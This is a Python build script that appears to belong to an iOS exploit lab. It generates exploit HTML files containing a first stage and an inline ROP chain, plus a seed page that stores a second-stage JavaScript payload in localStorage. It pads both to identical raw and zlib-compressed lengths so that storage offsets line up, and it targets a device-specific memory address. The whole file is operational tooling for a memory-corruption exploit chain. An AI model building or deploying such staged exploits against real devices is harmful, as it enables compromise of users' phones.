#!/usr/bin/env python3
"""Build the UB-fixed inline pair.

The exploit HTML carries stage A + the inline UB-ROP; the seed HTML stores only
the real 3,617-byte stage B under n1s2.  Because the Postbox rewrite must keep
the t7 value/compressed offsets identical, the seed and the exploit must have
the same (raw, zlib9) pair.  The inline ROP is incompressible, so the common raw
length is 4,300 (> 4,096: the 4 KB limit is the widget *storage*, not the HTML)
and both files are padded to the same compressed length with a trailing comment.

The UB is allocated by stage A (before the stage-B 64x4096 burst) and the inline
ROP consumes globalThis.UB; a fresh Uint8Array(2048) inside the ROP would land
~256 KB past the +/-64 KiB scan around D (device U_NF D=0x105fc5410).
"""
import hashlib, json, os, random, sys, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
sys.path.insert(0,HERE)
from pad_inline_z import all_a, pad_to_z

RAW=4600
STAGEB=os.path.join(LAB,'..','qjs_postsnapshot','ios_n1','payload','n1ios_stage2_ab72.js')

def seed_base():
    B=open(STAGEB).read()
    LIT=json.dumps(B)
    return B,('<div id="v">N1IOS_SEED_INLINE</div><script>try{var B='+LIT+
              ';localStorage.setItem("n1s2",B);document.getElementById("v").textContent="SEED OK "+B.length}'
              'catch(e){document.getElementById("v").textContent="SEED ERR "+e}</script>')

def seed_for_z(z):
    B,base=seed_base()
    ov=len('\n<!--')+len('-->'); body_len=RAW-len(base)-ov
    assert body_len>=0,(len(base),body_len)
    ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    best=None
    for r in range(0,body_len+1):
        for sd in range(0,80):
            rng=random.Random((sd*1315423911+r*2654435761)&0xffffffff)
            body=''.join(rng.choice(ALPHA) for _ in range(r))+'A'*(body_len-r)
            d=base+'\n<!--'+body+'-->'
            zz=len(zlib.compress(d.encode(),9))
            if best is None or abs(zz-z)<abs(best[0]-z): best=(zz,d)
            if zz==z: return d,zz,B
    return None,best[0],B

if __name__=='__main__':
    # 1. raw 4,300 all-A z for each variant; common target = max
    ins={}
    for tag in ('h200','h150'):
        src=os.path.join(PAY,f'ls_final_inline_{tag}_ios_in.html')
        h=open(src).read()
        _,z0,_=all_a(h,RAW)
        ins[tag]=(h,z0); print(tag,'all-A z',z0)
    target=max(z for _,z in ins.values())
    print('common z target',target)
    # 2. tune each inline to the common z
    outs={}
    for tag,(h,_) in ins.items():
        d,z=pad_to_z(h,RAW,target)
        assert d is not None,(tag,z)
        outs[tag]=d
        fn=f'ls_final_inline_{tag}_ios_4600_ub.html'
        open(os.path.join(PAY,fn),'w').write(d)
        print(fn,'raw',len(d),'zlib9',len(zlib.compress(d.encode(),9)),
              'sha',hashlib.sha256(d.encode()).hexdigest())
    # 3. seed at the same pair
    d,z,B=seed_for_z(target)
    assert d is not None,('seed z',z)
    fn='ls_seed_inline_4600_ub.html'
    open(os.path.join(PAY,fn),'w').write(d)
    print(fn,'raw',len(d),'zlib9',len(zlib.compress(d.encode(),9)),
          'sha',hashlib.sha256(d.encode()).hexdigest(),'stageB',len(B))
